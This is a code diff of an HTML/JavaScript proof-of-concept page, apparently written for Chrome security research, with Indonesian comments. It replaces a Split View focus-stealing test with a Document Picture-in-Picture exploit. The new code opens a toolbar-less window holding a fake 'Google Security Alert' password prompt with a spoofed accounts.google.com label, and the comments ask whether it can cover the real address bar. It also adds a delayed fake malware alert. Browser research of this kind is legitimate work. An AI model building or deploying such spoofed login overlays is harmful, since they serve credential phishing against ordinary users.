@@ -2,79 +2,71 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Chrome UI Research - FARISSAL B</title>
+    <title>Chrome Advanced Researcher - FARISSAL B</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #121212; color: #fff; padding: 30px; text-align: center; }
-        .box { border: 2px solid #ff00ff; padding: 20px; border-radius: 15px; background: #1e1e1e; display: inline-block; }
-        button { background: #ff00ff; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 8px; cursor: pointer; margin: 10px; font-weight: bold; }
-        button:hover { background: #d400d4; }
-        #log { margin-top: 30px; text-align: left; background: #000; color: #0f0; padding: 15px; border-radius: 5px; font-family: monospace; height: 200px; overflow-y: auto; border: 1px solid #333; }
-        .alert { color: #ff3333; font-weight: bold; }
+        body { font-family: 'Consolas', monospace; background: #111; color: #0f0; padding: 40px; text-align: center; }
+        .box { border: 2px solid #0f0; padding: 30px; border-radius: 10px; background: #000; box-shadow: 0 0 20px #0f03; }
+        button { background: #0f0; color: #000; border: none; padding: 15px 25px; font-size: 16px; border-radius: 5px; cursor: pointer; font-weight: bold; margin: 10px; }
+        button:hover { background: #0c0; }
+        #log { margin-top: 20px; text-align: left; height: 150px; overflow-y: auto; border-top: 1px solid #333; padding-top: 10px; font-size: 12px; }
+        .warning { color: #ff0; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h2>Chrome UI/Logic Researcher v3.0</h2>
-    <p>Target: <b>Split View / Side Panel Focus Bypass</b></p>
+    <h2>Chrome Security Researcher [Farissal B]</h2>
+    <p>Target: <b>Document Picture-in-Picture (PiP) Logic Flaw</b></p>
     
-    <button onclick="triggerSpoof('file')">Test File Picker</button>
-    <button onclick="triggerSpoof('print')">Test Print Dialog</button>
-    <button onclick="delayedTrigger()">Delayed Attack (5s)</button>
+    <button id="btnPiP">Open Research Window (PiP)</button>
+    <button onclick="delayedSpoof()">Delayed UI Test (5s)</button>
     
-    <div id="log">>> Scanner Ready. Push to GitHub and test in Split View.</div>
+    <div id="log">>> Ready to scan. Document PiP requires User Gesture.</div>
 </div>
 
 <script>
     const logBox = document.getElementById('log');
+    function log(msg) { logBox.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`; logBox.scrollTop = logBox.scrollHeight; }
 
-    function log(msg, isAlert = false) {
-        const div = document.createElement('div');
-        div.innerHTML = `[${new Date().toLocaleTimeString()}] ${isAlert ? '<span class="alert">!!!</span> ' : ''}${msg}`;
-        logBox.appendChild(div);
-        logBox.scrollTop = logBox.scrollHeight;
-    }
+    // 1. MEMBUKA DOCUMENT PiP (Fitur Baru Chrome)
+    document.getElementById('btnPiP').addEventListener('click', async () => {
+        try {
+            // Kita buka jendela PiP tanpa toolbar
+            const pipWindow = await window.documentPictureInPicture.requestWindow({
+                width: 400,
+                height: 200,
+            });
 
-    // Fungsi untuk memicu dialog sistem
-    function triggerSpoof(type) {
-        log(`Triggering ${type} dialog...`);
-        
-        if (type === 'file') {
-            const input = document.createElement('input');
-            input.type = 'file';
-            input.click(); // Mencoba membuka file picker
-        } else if (type === 'print') {
-            window.print(); // Mencoba membuka print dialog
+            log("PiP Window Opened.");
+
+            // 2. SPOOFING CONTENT: Kita isi PiP dengan UI palsu
+            pipWindow.document.body.innerHTML = `
+                <div style="background: #f1f1f1; color: #000; padding: 20px; font-family: sans-serif; border: 4px solid red; height: 100vh;">
+                    <h3 style="margin:0">Google Security Alert</h3>
+                    <p>Sesi anda berakhir. Masukkan password Google:</p>
+                    <input type="password" style="width: 100%; padding: 5px;">
+                    <button style="margin-top: 10px;">Login</button>
+                    <p style="font-size: 10px; color: #666;">Domain: accounts.google.com</p>
+                </div>
+            `;
+
+            // 3. LOGIC TEST: Bisakah PiP ini menutupi Omnibox asli?
+            log("Cek: Apakah jendela ini bisa lo geser ke atas Bar Alamat Chrome asli?");
+
+        } catch (e) {
+            log("Error: " + e.message + " (Mungkin fitur belum aktif atau browser gak support)");
         }
-    }
-
-    // Teknik "Delayed Attack": 
-    // Menjalankan perintah SETELAH user pindah ke tab lain (Split View test)
-    function delayedTrigger() {
-        log("Delayed attack started. PINDAH KE TAB LAIN SEKARANG!");
-        
-        setTimeout(() => {
-            log("Executing background trigger...", true);
-            
-            // Mencoba mencuri fokus dengan memicu dialog saat tab ini tidak aktif
-            const input = document.createElement('input');
-            input.type = 'file';
-            input.click();
-            
-            // Cek apakah dialog berhasil muncul di atas tab yang sedang aktif
-            if (document.hidden) {
-                log("DANGER: Dialog triggered while tab was HIDDEN!", true);
-            } else {
-                log("Tab was active, isolation working.");
-            }
-        }, 5000); // 5 detik untuk lo pindah fokus ke tab sebelah (Google/Drive)
-    }
-
-    // Deteksi perubahan visibilitas tab
-    document.addEventListener("visibilitychange", () => {
-        log(`Tab Status: ${document.hidden ? 'HIDDEN' : 'VISIBLE'}`);
     });
 
+    // 4. DELAYED SPOOF: Mencoba pancing interaksi saat user gak fokus
+    function delayedSpoof() {
+        log("Delayed attack started. Tunggu 5 detik...");
+        setTimeout(() => {
+            // Mencoba memicu alert atau dialog dari background
+            alert("Sistem Keamanan Chrome: Deteksi Malware!");
+            log("Alert triggered. Apakah muncul di depan tab lain?", true);
+        }, 5000);
+    }
 </script>
 </body>
 </html>
